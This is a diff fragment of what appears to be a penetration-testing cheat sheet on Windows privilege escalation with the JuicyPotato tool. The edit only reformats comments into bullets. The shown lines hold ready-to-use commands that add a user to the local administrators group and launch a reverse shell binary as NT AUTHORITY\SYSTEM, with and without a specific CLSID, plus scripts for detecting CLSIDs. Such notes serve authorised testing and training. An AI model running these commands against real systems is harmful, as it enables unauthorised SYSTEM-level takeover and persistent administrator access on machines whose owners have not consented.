@@ -100,24 +100,24 @@ SeIncreaseWorkingSetPrivilege Increase a process working set               Disab
 
 ➤ 3. Basic attacks without specific CLSID
 
-// Add a user in the administrators group
+• Add a user in the administrators group
 .\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t * -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
 
-// Execute a reverse shell as NT AUTHORITY\SYSTEM
+• Execute a reverse shell as NT AUTHORITY\SYSTEM
 .\JuicyPotato.exe -l 1337 -p C:\Users\public\rshell.exe -t *
 
 ➤ 4. Using specific CLSID
 
 helper : https://ohpe.it/juicy-potato/CLSID/
 
-//Manual CLSID dectection based on OS version
+• Manual CLSID dectection based on OS version
 https://ohpe.it/juicy-potato/CLSID/
 
-//Automated CLSID detection scripts
+• Automated CLSID detection scripts
 .\GetCLSID.ps1
 or 
 .\clisd-detector.bat
 
-//Add a user in the administrators group using the specific CLSID
+• Add a user in the administrators group using the specific CLSID
 .\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t {CLSID} -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
 ```
